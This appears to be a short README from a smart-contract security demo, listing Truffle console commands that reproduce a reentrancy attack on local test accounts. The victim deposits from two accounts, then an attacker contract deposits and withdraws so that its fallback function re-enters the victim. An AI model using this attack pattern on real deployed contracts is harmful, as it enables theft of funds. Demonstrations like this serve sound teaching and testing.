## Reentrancy

Reproducing attack using these contracts.

Depositing some amount in 2 differents accounts balances:
```
$victim: Reentrancy.deployed().then(instance=> instance.deposit({value: 10, from : web3.eth.accounts[1]}))
$victim: Reentrancy.deployed().then(instance=> instance.deposit({value: 20, from : web3.eth.accounts[0]}))
```
Attacker calls withdraw from a contract, so it will receive a payment and fallback function will be executed.
```
$attacker: ReentrancyAttacker.deployed().then(instance=> instance.depositInContract({value : 5}))
$attacker: ReentrancyAttacker.deployed().then(instance=> instance.withdrawFromContract())
```

